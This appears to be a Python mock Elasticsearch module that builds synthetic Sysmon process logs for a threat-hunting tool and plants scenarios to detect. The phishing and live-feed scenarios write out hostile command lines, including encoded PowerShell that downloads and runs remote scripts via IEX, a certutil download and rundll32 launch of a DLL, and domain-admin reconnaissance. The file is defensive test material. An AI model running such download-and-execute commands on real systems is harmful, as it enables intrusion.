"""
mock_responses.py — a fake Elasticsearch for the Family Tree Detective.

Generates a deterministic, ECS-shaped Windows dataset (Sysmon event 1 /
process-create) for a handful of users, and answers each named query in
query_dict.py with a response shaped exactly like the real thing
(hits.hits[]._source, hits.hits[].sort, aggregations.*.buckets).

It does NOT parse query DSL: it reads the query *name* + *params* and fakes
the result. Once you point FTD_MODE=elastic at a cluster, this file is unused.

Planted stories (so the UI has something to find):
  bob.martin   phishing doc → encoded PowerShell → certutil download → rundll32 → recon
  erin.patel   fake svchost.exe running from %TEMP% doing domain recon
  alice.wong   unsigned installer run from Downloads (grey-zone)
  dave.kim     developer with ~10k noisy, harmless build processes (scale test)
  carol.diaz   clean
"""
from __future__ import annotations

import base64
import hashlib
import random
import re
import shlex
from collections import Counter, defaultdict
from datetime import datetime, timedelta, timezone

UTC = timezone.utc
DAYS = 14
INDEX_NAME = ".ds-logs-windows.sysmon_operational-default-2026.10.18-000001"

MW, MC = "Microsoft Windows", "Microsoft Corporation"
OFFICE_DIR = r"C:\Program Files\Microsoft Office\root\Office16"
VS_DIR = r"C:\Program Files\Microsoft Visual Studio\2022\Professional"
MSVC_DIR = VS_DIR + r"\VC\Tools\MSVC\14.40.33807\bin\Hostx64\x64"

PROGRAMS = {
    "explorer.exe": (r"C:\Windows\explorer.exe", MW),
    "chrome.exe": (r"C:\Program Files\Google\Chrome\Application\chrome.exe", "Google LLC"),
    "outlook.exe": (OFFICE_DIR + r"\OUTLOOK.EXE", MC),
    "winword.exe": (OFFICE_DIR + r"\WINWORD.EXE", MC),
    "excel.exe": (OFFICE_DIR + r"\EXCEL.EXE", MC),
    "ms-teams.exe": (r"C:\Program Files\WindowsApps\MSTeams_24215.1007.3082.1590_x64__8wekyb3d8bbwe\ms-teams.exe", MC),
    "onedrive.exe": (r"C:\Program Files\Microsoft OneDrive\OneDrive.exe", MC),
    "notepad.exe": (r"C:\Windows\System32\notepad.exe", MW),
    "cmd.exe": (r"C:\Windows\System32\cmd.exe", MW),
    "conhost.exe": (r"C:\Windows\System32\conhost.exe", MW),
    "powershell.exe": (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", MW),
    "mmc.exe": (r"C:\Windows\System32\mmc.exe", MW),
    "taskmgr.exe": (r"C:\Windows\System32\Taskmgr.exe", MW),
    "ping.exe": (r"C:\Windows\System32\PING.EXE", MW),
    "ipconfig.exe": (r"C:\Windows\System32\ipconfig.exe", MW),
    "whoami.exe": (r"C:\Windows\System32\whoami.exe", MW),
    "net.exe": (r"C:\Windows\System32\net.exe", MW),
    "nltest.exe": (r"C:\Windows\System32\nltest.exe", MW),
    "certutil.exe": (r"C:\Windows\System32\certutil.exe", MW),
    "rundll32.exe": (r"C:\Windows\System32\rundll32.exe", MW),
    "code.exe": (r"C:\Users\{user}\AppData\Local\Programs\Microsoft VS Code\Code.exe", MC),
    "node.exe": (r"C:\Program Files\nodejs\node.exe", "OpenJS Foundation"),
    "git.exe": (r"C:\Program Files\Git\cmd\git.exe", "Johannes Schindelin"),
    "python.exe": (r"C:\Users\{user}\AppData\Local\Programs\Python\Python312\python.exe", "Python Software Foundation"),
    "msbuild.exe": (VS_DIR + r"\MSBuild\Current\Bin\amd64\MSBuild.exe", MC),
    "cl.exe": (MSVC_DIR + r"\cl.exe", MC),
    "link.exe": (MSVC_DIR + r"\link.exe", MC),
}

USERS = {
    "alice.wong": {"host": "WS-FIN-014", "profile": "office", "seed": 11},
    "bob.martin": {"host": "WS-SAL-022", "profile": "office", "seed": 22},
    "carol.diaz": {"host": "WS-HR-007", "profile": "office", "seed": 33},
    "dave.kim": {"host": "WS-DEV-031", "profile": "dev", "seed": 44},
    "erin.patel": {"host": "WS-IT-003", "profile": "admin", "seed": 55},
}

DOCS = ["Q3 Board Summary", "Team Offsite Agenda", "Vendor Contract v4", "Onboarding Checklist", "Policy Draft", "Meeting Notes"]
SHEETS = ["Budget FY27", "Pipeline Nov", "Headcount Plan", "Expense Report", "Forecast"]
NODE_TAILS = [
    r"node_modules\typescript\lib\tsserver.js --useInferredProjectPerProjectRoot",
    r"node_modules\eslint\bin\eslint.js --stdin --format json",
    r"node_modules\.bin\vite build",
    r"scripts\gen-api.js --out src\api",
]
GIT_TAILS = ["status -z -uall", "fetch --prune", "rev-parse --show-toplevel", "log --oneline -n 20", "diff --stat"]


# ───────────────────────── small utils ─────────────────────────
def iso(dt: datetime) -> str:
    return dt.astimezone(UTC).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def parse(ts: str) -> datetime:
    return datetime.fromisoformat(ts.replace("Z", "+00:00"))


def ms(dt: datetime) -> int:
    return int(dt.timestamp() * 1000)


def encode_ps(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


def _split(cmd: str) -> list[str]:
    try:
        parts = shlex.split(cmd, posix=False)
    except ValueError:
        parts = cmd.split()
    return [p.strip('"') for p in parts]


_REL = re.compile(r"now-(\d+)([hd])")


def _since_dt(since: str) -> datetime:
    m = _REL.fullmatch(since or "")
    now = datetime.now(UTC)
    if not m:
        return now - timedelta(days=7)
    n, unit = int(m.group(1)), m.group(2)
    return now - (timedelta(hours=n) if unit == "h" else timedelta(days=n))


# ───────────────────────── generator ─────────────────────────
class _Gen:
    """Spawns ECS process documents for one user on one host."""

    def __init__(self, user: str, host: str, seed: int, now: datetime):
        self.user, self.host, self.now = user, host, now
        self.rng = random.Random(seed)
        self.home = rf"C:\Users\{user}"
        self.docs: list[dict] = []

    def _guid(self) -> str:
        h = f"{self.rng.getrandbits(128):032x}"
        return "{" + f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:]}" + "}"

    def _pid(self) -> int:
        return self.rng.randrange(1000, 40000, 4)  # Windows PIDs are multiples of 4

    def virtual(self, name: str, exe: str, cmd: str) -> dict:
        """A parent that exists but isn't in this user's data (e.g. userinit.exe running as SYSTEM)."""
        return {"entity_id": self._guid(), "pid": self._pid(), "name": name, "executable": exe, "command_line": cmd}

    def spawn(self, parent, name, start, tail="", *, exe=None, cmd=None, cwd=None,
              signer=..., seconds=None, exit_code=0):
        if parent is None or start > self.now:
            return None
        default_exe, default_signer = PROGRAMS.get(name, (None, None))
        exe = exe or default_exe.format(user=self.user)
        signer = default_signer if signer is ... else signer
        cmd = cmd or f'"{exe}" {tail}'.strip()
        args = [exe] + _split(cmd)[1:]
        seconds = self.rng.uniform(0.5, 90) if seconds is None else seconds
        end = start + timedelta(seconds=seconds)
        proc = {
            "entity_id": self._guid(),
            "pid": self._pid(),
            "name": name,
            "executable": exe,
            "command_line": cmd,
            "args": args,
            "args_count": len(args),
            "working_directory": cwd or self.home,
            "start": iso(start),
            "hash": {"sha256": hashlib.sha256(exe.lower().encode()).hexdigest()},
            "code_signature": {"exists": signer is not None, "trusted": signer is not None},
            "parent": {k: parent[k] for k in ("entity_id", "pid", "name", "executable", "command_line")},
        }
        if signer:
            proc["code_signature"]["subject_name"] = signer
        if end <= self.now:
            proc["end"] = iso(end)
            proc["exit_code"] = exit_code
        self.docs.append({
            "@timestamp": iso(start),
            "event": {"category": ["process"], "type": ["start"], "kind": "event", "code": "1",
                      "action": "Process Create (rule: ProcessCreate)", "provider": "Microsoft-Windows-Sysmon",
                      "module": "sysmon", "dataset": "windows.sysmon_operational"},
            "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "1",
                       "computer_name": f"{self.host}.contoso.local",
                       "provider_name": "Microsoft-Windows-Sysmon"},
            "host": {"name": self.host, "hostname": self.host,
                     "os": {"family": "windows", "name": "Windows 11 Enterprise", "version": "10.0"}},
            "user": {"name": self.user, "domain": "CONTOSO"},
            "process": proc,
        })
        return proc


def _workday(g: _Gen, day: datetime) -> dict | None:
    start = day + timedelta(hours=8, minutes=g.rng.randint(0, 50))
    userinit = g.virtual("userinit.exe", r"C:\Windows\System32\userinit.exe", r"C:\Windows\system32\userinit.exe")
    exp = g.spawn(userinit, "explorer.exe", start, cmd=r"C:\Windows\Explorer.EXE", seconds=9.5 * 3600)
    if exp is None:
        return None

    def at(lo: float, hi: float) -> datetime:
        return start + timedelta(minutes=g.rng.uniform(lo, hi))

    g.spawn(exp, "onedrive.exe", at(0.2, 1), "/background", seconds=9 * 3600)
    g.spawn(exp, "ms-teams.exe", at(0.3, 2), "msteams:system-initiated", seconds=9 * 3600)
    outlook = g.spawn(exp, "outlook.exe", at(1, 10), seconds=9 * 3600)
    chrome = g.spawn(exp, "chrome.exe", at(2, 20), seconds=8 * 3600)
    g.spawn(chrome, "chrome.exe", at(20, 21), "--type=gpu-process --field-trial-handle=1904,i,1", seconds=8 * 3600)
    for i in range(g.rng.randint(12, 45)):
        g.spawn(chrome, "chrome.exe", at(21, 520),
                f"--type=renderer --renderer-client-id={i + 5} --lang=en-US --launch-time-ticks={g.rng.randint(10**9, 10**10)}",
                seconds=g.rng.uniform(30, 7200),
                exit_code=-1073741819 if g.rng.random() < 0.02 else 0)
    for _ in range(g.rng.randint(0, 3)):
        g.spawn(exp, "winword.exe", at(30, 500), f'/n "{g.home}\\Documents\\{g.rng.choice(DOCS)}.docx"',
                seconds=g.rng.uniform(300, 5400))
    for _ in range(g.rng.randint(0, 3)):
        g.spawn(exp, "excel.exe", at(30, 500), f'"{g.home}\\Documents\\{g.rng.choice(SHEETS)}.xlsx"',
                seconds=g.rng.uniform(300, 5400))
    if g.rng.random() < 0.3:
        g.spawn(exp, "notepad.exe", at(30, 500), f'"{g.home}\\Desktop\\notes.txt"', seconds=g.rng.uniform(60, 3600))
    return {"explorer": exp, "outlook": outlook, "chrome": chrome, "at": at, "start": start}


def _dev(g: _Gen, s: dict, light: bool = False) -> None:
    exp, at = s["explorer"], s["at"]
    repo = r"C:\src\contoso-platform"
    code = g.spawn(exp, "code.exe", at(5, 15), f'"{repo}"', cwd=repo, seconds=8 * 3600)
    for _ in range(g.rng.randint(15, 50)):
        g.spawn(code, "node.exe", at(15, 500), g.rng.choice(NODE_TAILS), cwd=repo, seconds=g.rng.uniform(5, 3600))
    for _ in range(g.rng.randint(10, 30)):
        g.spawn(code, "git.exe", at(15, 500), g.rng.choice(GIT_TAILS), cwd=repo, seconds=g.rng.uniform(0.1, 3))
    term = g.spawn(exp, "powershell.exe", at(10, 30), "-NoLogo", cwd=repo, seconds=8 * 3600)
    g.spawn(term, "conhost.exe", at(30, 31), "0xffffffff -ForceV1", seconds=8 * 3600)
    for _ in range(g.rng.randint(1, 2) if light else g.rng.randint(4, 9)):
        t0 = at(40, 480)
        mb = g.spawn(term, "msbuild.exe", t0, "Contoso.Platform.sln /m /p:Configuration=Release", cwd=repo, seconds=600)
        for i in range(g.rng.randint(80, 200)):
            g.spawn(mb, "cl.exe", t0 + timedelta(seconds=2 + i * 2.5),
                    f"/c /O2 /MD /EHsc /I include src\\core\\module_{i:03}.cpp", cwd=repo,
                    seconds=g.rng.uniform(0.5, 9), exit_code=2 if g.rng.random() < 0.01 else 0)
        for j in range(g.rng.randint(2, 6)):
            g.spawn(mb, "link.exe", t0 + timedelta(seconds=520 + j * 4),
                    f"/OUT:bin\\Release\\contoso_{j}.dll /DLL /LTCG", cwd=repo, seconds=g.rng.uniform(2, 20))
        if g.rng.random() < 0.4:
            g.spawn(term, "python.exe", t0 + timedelta(seconds=600), "-m pytest tests -q", cwd=repo,
                    seconds=g.rng.uniform(20, 200))


def _admin(g: _Gen, s: dict) -> None:
    exp, at = s["explorer"], s["at"]
    g.spawn(exp, "mmc.exe", at(20, 400), r'"C:\Windows\system32\dsa.msc"', seconds=g.rng.uniform(300, 3600))
    ps = g.spawn(exp, "powershell.exe", at(10, 60), "-NoProfile", seconds=6 * 3600)
    for _ in range(g.rng.randint(2, 8)):
        tool, tail = g.rng.choice([("whoami.exe", "/groups"), ("ipconfig.exe", "/all"),
                                   ("ping.exe", "-n 4 fs01.contoso.local"), ("nltest.exe", "/sc_query:contoso.local")])
        g.spawn(ps, tool, at(60, 500), tail, cwd=r"C:\Windows\System32")
    if g.rng.random() < 0.5:
        g.spawn(exp, "taskmgr.exe", at(30, 500), "/7", seconds=g.rng.uniform(30, 600))


# ── planted incidents ──
def _phish(g: _Gen, s: dict) -> None:
    t = s["at"](120, 150)
    word = g.spawn(s["outlook"], "winword.exe", t,
                   f'/n "{g.home}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\K3T9QZ1M\\Invoice_88231.docm" /o ""',
                   seconds=900)
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/stage2.ps1')"
    ps = g.spawn(word, "powershell.exe", t + timedelta(seconds=8), f"-nop -w hidden -enc {encode_ps(payload)}",
                 cwd=g.home + r"\Documents", seconds=240)
    g.spawn(ps, "certutil.exe", t + timedelta(seconds=21),
            r"-urlcache -split -f http://203.0.113.45/u.dat C:\Users\Public\u.dll", seconds=3)
    rd = g.spawn(ps, "rundll32.exe", t + timedelta(seconds=30), r"C:\Users\Public\u.dll,DllRegisterServer",
                 seconds=4 * 3600)
    c = g.spawn(rd, "cmd.exe", t + timedelta(seconds=95),
                cmd=r'C:\Windows\system32\cmd.exe /c "whoami /all & net group "domain admins" /domain"', seconds=4)
    g.spawn(c, "whoami.exe", t + timedelta(seconds=96), "/all", seconds=1)
    g.spawn(c, "net.exe", t + timedelta(seconds=97), 'group "domain admins" /domain', seconds=2)


def _masquerade(g: _Gen, s: dict) -> None:
    t = s["at"](300, 330)
    temp = g.home + r"\AppData\Local\Temp"
    c = g.spawn(s["explorer"], "cmd.exe", t, cmd=r'cmd.exe /c "%TEMP%\svchost.exe -k netsvcs"', seconds=5)
    fake = g.spawn(c, "svchost.exe", t + timedelta(seconds=2), exe=temp + r"\svchost.exe",
                   cmd=f'"{temp}\\svchost.exe" -k netsvcs', signer=None, cwd=temp, seconds=6 * 3600)
    g.spawn(fake, "nltest.exe", t + timedelta(seconds=40), "/dclist:contoso.local", cwd=temp)
    g.spawn(fake, "net.exe", t + timedelta(seconds=55), 'group "Domain Admins" /domain', cwd=temp)
    g.spawn(fake, "whoami.exe", t + timedelta(seconds=61), "/priv", cwd=temp)


def _sketchy_installer(g: _Gen, s: dict) -> None:
    t = s["at"](200, 260)
    dl = g.home + r"\Downloads"
    g.spawn(s["explorer"], "pdfconvertpro_setup.exe", t, exe=dl + r"\PDFConvertPro_Setup.exe", signer=None,
            cwd=dl, seconds=40)


INCIDENTS = {"bob.martin": (2, _phish), "erin.patel": (1, _masquerade), "alice.wong": (4, _sketchy_installer)}


def generate_dataset(now: datetime) -> list[dict]:
    docs: list[dict] = []
    today = now.replace(hour=0, minute=0, second=0, microsecond=0)
    for user, cfg in USERS.items():
        g = _Gen(user, cfg["host"], cfg["seed"], now)
        incident = INCIDENTS.get(user)
        for back in range(DAYS - 1, -1, -1):
            day = today - timedelta(days=back)
            weekend = day.weekday() >= 5
            is_incident_day = incident is not None and back == incident[0]
            if weekend and not is_incident_day and g.rng.random() < 0.7:
                continue
            s = _workday(g, day)
            if s is None:
                continue
            if cfg["profile"] == "dev":
                _dev(g, s, light=weekend)
            elif cfg["profile"] == "admin":
                _admin(g, s)
            if is_incident_day:
                incident[1](g, s)
        docs.extend(g.docs)
    docs.sort(key=lambda d: (d["@timestamp"], d["process"]["entity_id"]))
    return docs


# ───────────────────────── live feed ─────────────────────────
class _LiveFeed:
    """Keeps 'producing' new process starts for one user every time it's polled."""

    def __init__(self, user: str, host: str):
        now = datetime.now(UTC)
        self.g = g = _Gen(user, host, random.randrange(1 << 30), now)
        boot = now - timedelta(minutes=45)
        userinit = g.virtual("userinit.exe", r"C:\Windows\System32\userinit.exe", r"C:\Windows\system32\userinit.exe")
        self.exp = g.spawn(userinit, "explorer.exe", boot, cmd=r"C:\Windows\Explorer.EXE", seconds=12 * 3600)
        self.outlook = g.spawn(self.exp, "outlook.exe", boot + timedelta(minutes=1), seconds=12 * 3600)
        self.chrome = g.spawn(self.exp, "chrome.exe", boot + timedelta(minutes=2), seconds=12 * 3600)
        self.last = now
        self.renderer = 100

    def produce_until(self, now: datetime) -> None:
        g = self.g
        g.now = now
        span = now - self.last
        if span.total_seconds() < 0.5:
            return
        for _ in range(g.rng.choice([0, 1, 1, 2, 2, 3])):
            t = self.last + span * g.rng.random()
            roll = g.rng.random()
            if roll < 0.55:
                self.renderer += 1
                g.spawn(self.chrome, "chrome.exe", t, f"--type=renderer --renderer-client-id={self.renderer} --lang=en-US",
                        seconds=g.rng.uniform(20, 900))
            elif roll < 0.7:
                g.spawn(self.exp, "notepad.exe", t, f'"{g.home}\\Desktop\\notes.txt"', seconds=g.rng.uniform(30, 600))
            elif roll < 0.88:
                name = g.rng.choice(["winword.exe", "excel.exe"])
                doc = f"{g.rng.choice(DOCS)}.docx" if name == "winword.exe" else f"{g.rng.choice(SHEETS)}.xlsx"
                g.spawn(self.exp, name, t, f'"{g.home}\\Documents\\{doc}"', seconds=g.rng.uniform(60, 1800))
            else:
                g.spawn(self.exp, "powershell.exe", t, "-NoProfile", seconds=g.rng.uniform(10, 300))
        if g.rng.random() < 0.08:  # occasional "bad thing happens right now"
            t = now - timedelta(seconds=2)
            xl = g.spawn(self.outlook, "excel.exe", t,
                         f'"{g.home}\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\7QX2L0PA\\Q4_bonus_list.xlsm"',
                         seconds=600)
            enc = encode_ps("IEX (iwr 'http://198.51.100.23/p.ps1' -UseBasicParsing)")
            c = g.spawn(xl, "cmd.exe", t + timedelta(milliseconds=600),
                        cmd=f"cmd.exe /c powershell -nop -w hidden -enc {enc}", seconds=3)
            g.spawn(c, "powershell.exe", t + timedelta(milliseconds=900), f"-nop -w hidden -enc {enc}", seconds=60)
        self.last = now
        del g.docs[:-2000]


# ───────────────────────── the fake client ─────────────────────────
class MockElastic:
    def __init__(self) -> None:
        self.docs = generate_dataset(datetime.now(UTC))
        self._ts = [parse(d["@timestamp"]) for d in self.docs]
        self._live: dict[str, _LiveFeed] = {}
        self._rng = random.Random(7)

    def respond(self, name: str, params: dict) -> dict:
        handler = getattr(self, f"_q_{name}", None)
        if handler is None:
            raise KeyError(f"MockElastic has no answer for query '{name}'")
        return handler(**params)

    # helpers
    def _window(self, since: str, user: str | None = None) -> list[dict]:
        lo = _since_dt(since)
        return [d for t, d in zip(self._ts, self.docs)
                if t >= lo and (user is None or d["user"]["name"] == user)]

    def _resp(self, hits: list[dict], total: int, aggregations: dict | None = None) -> dict:
        out = {
            "took": self._rng.randint(3, 60),
            "timed_out": False,
            "_shards": {"total": 3, "successful": 3, "skipped": 0, "failed": 0},
            "hits": {"total": {"value": total, "relation": "eq"}, "max_score": None, "hits": hits},
        }
        if aggregations is not None:
            out["aggregations"] = aggregations
        return out

    @staticmethod
    def _hit(d: dict) -> dict:
        eid = d["process"]["entity_id"]
        return {"_index": INDEX_NAME, "_id": hashlib.sha1(eid.encode()).hexdigest()[:20], "_score": None,
                "_source": d, "sort": [ms(parse(d["@timestamp"])), eid]}

    # one method per query in query_dict.QUERIES
    def _q_users_overview(self, since: str = "now-7d") -> dict:
        docs = self._window(since)
        by_user: dict[str, list[dict]] = defaultdict(list)
        for d in docs:
            by_user[d["user"]["name"]].append(d)
        buckets = []
        for user, ds in sorted(by_user.items(), key=lambda kv: -len(kv[1])):
            hosts = Counter(d["host"]["name"] for d in ds)
            last = max(d["@timestamp"] for d in ds)
            buckets.append({
                "key": user, "doc_count": len(ds),
                "hosts": {"doc_count_error_upper_bound": 0, "sum_other_doc_count": 0,
                          "buckets": [{"key": h, "doc_count": c} for h, c in hosts.most_common(3)]},
                "last_seen": {"value": ms(parse(last)), "value_as_string": last},
            })
        return self._resp([], len(docs), {"users": {"doc_count_error_upper_bound": 0,
                                                    "sum_other_doc_count": 0, "buckets": buckets}})

    def _q_user_summary(self, user: str, since: str = "now-7d") -> dict:
        docs = self._window(since, user)
        hosts = Counter(d["host"]["name"] for d in docs)
        edges = Counter((d["process"]["parent"]["name"], d["process"]["name"]) for d in docs)
        hist = Counter(parse(d["@timestamp"]).replace(minute=0, second=0, microsecond=0) for d in docs)
        t = _since_dt(since).replace(minute=0, second=0, microsecond=0)
        end = datetime.now(UTC)
        per_hour = []
        while t <= end:
            per_hour.append({"key_as_string": iso(t), "key": ms(t), "doc_count": hist.get(t, 0)})
            t += timedelta(hours=1)
        aggs = {
            "unique_executables": {"value": len({d["process"]["executable"] for d in docs})},
            "hosts": {"buckets": [{"key": h, "doc_count": c} for h, c in hosts.most_common(20)]},
            "per_hour": {"buckets": per_hour},
            "edges": {"doc_count_error_upper_bound": 0, "sum_other_doc_count": 0,
                      "buckets": [{"key": [p, c], "key_as_string": f"{p}|{c}", "doc_count": n}
                                  for (p, c), n in edges.most_common(300)]},
        }
        return self._resp([], len(docs), aggs)

    def _q_user_processes(self, user: str, since: str = "now-7d", page_size: int = 2000,
                          search_after: list | None = None) -> dict:
        docs = self._window(since, user)
        total = len(docs)
        if search_after:
            key = (int(search_after[0]), str(search_after[1]))
            docs = [d for d in docs if (ms(parse(d["@timestamp"])), d["process"]["entity_id"]) > key]
        return self._resp([self._hit(d) for d in docs[:page_size]], total)

    def _q_live_since(self, user: str, since_ts: str, size: int = 200) -> dict:
        feed = self._live.get(user)
        if feed is None:
            feed = self._live[user] = _LiveFeed(user, USERS.get(user, {}).get("host", "WS-UNKNOWN"))
        feed.produce_until(datetime.now(UTC))
        lo = parse(since_ts)
        docs = sorted((d for d in feed.g.docs if parse(d["@timestamp"]) > lo), key=lambda d: d["@timestamp"])[:size]
        return self._resp([self._hit(d) for d in docs], len(docs))
